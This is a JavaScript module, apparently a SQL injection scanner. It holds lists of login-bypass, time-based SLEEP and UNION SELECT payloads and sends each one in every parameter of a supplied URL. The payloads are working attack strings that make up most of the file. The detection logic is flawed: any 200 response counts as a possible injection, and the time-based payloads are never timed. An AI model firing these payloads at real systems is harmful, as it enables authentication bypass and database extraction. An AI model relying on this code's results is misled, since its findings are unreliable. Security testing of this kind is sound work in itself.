const axios = require('axios');

const errorBasedPayloads = [
  `' OR 1=1--`,
  `" OR 1=1--`,
  `' OR '1'='1'--`,
  `" OR "1"="1"--`,
  `admin' --`,
  `admin' #`,
  `admin'/*`,
  `admin' or '1'='1`,
  `admin' or '1'='1'--`,
  `admin' or '1'='1'#`,
  `admin' or '1'='1'/*`,
  `admin') or ('1'='1`,
  `admin') or ('1'='1'--`,
  `admin') or ('1'='1'#`,
  `admin') or ('1'='1'/*`,
  `admin" --`,
  `admin" #`,
  `admin"/*`,
  `admin" or "1"="1`,
  `admin" or "1"="1"--`,
  `admin" or "1"="1"#`,
  `admin" or "1"="1"/*`,
  `admin") or ("1"="1`,
  `admin") or ("1"="1"--`,
  `admin") or ("1"="1"#`,
  `admin") or ("1"="1"/*`
];

const timeBasedPayloads = [
  `' OR SLEEP(5)--`,
  `" OR SLEEP(5)--`,
  `' OR 1=1; SLEEP(5)--`,
  `" OR 1=1; SLEEP(5)--`,
  `admin' OR SLEEP(5)--`,
  `admin" OR SLEEP(5)--`
];

const unionBasedPayloads = [
  `' UNION SELECT null,null--`,
  `" UNION SELECT null,null--`,
  `' UNION SELECT null,version()--`,
  `" UNION SELECT null,version()--`,
  `' UNION SELECT null,database()--`,
  `" UNION SELECT null,database()--`,
  `' UNION SELECT null,user()--`,
  `" UNION SELECT null,user()--`
];

async function testSqlInjection(url, params, authParams) {
  const results = {};

  const testPayloads = async (payloads, payloadType) => {
    for (const param in params) {
      results[param] = results[param] || [];
      
      for (const payload of payloads) {
        const testParams = { ...params, [param]: payload };
        try {
          const response = await axios.get(url, { params: testParams, auth: authParams });
          
          if (response.data.includes('error') || response.data.includes('syntax')) {
            results[param].push({ payload, type: payloadType, status: 'Possible SQL Injection (Error)' });
          } else if (response.status === 200) {
            results[param].push({ payload, type: payloadType, status: 'Possible SQL Injection (No Error)' });
          }
        } catch (error) {
          results[param].push({ payload, type: payloadType, status: `Request failed: ${error.message}` });
        }
      }
    }
  };

  await testPayloads(errorBasedPayloads, 'Error-based');
  await testPayloads(timeBasedPayloads, 'Time-based');
  await testPayloads(unionBasedPayloads, 'Union-based');

  return results;
}

module.exports = testSqlInjection;
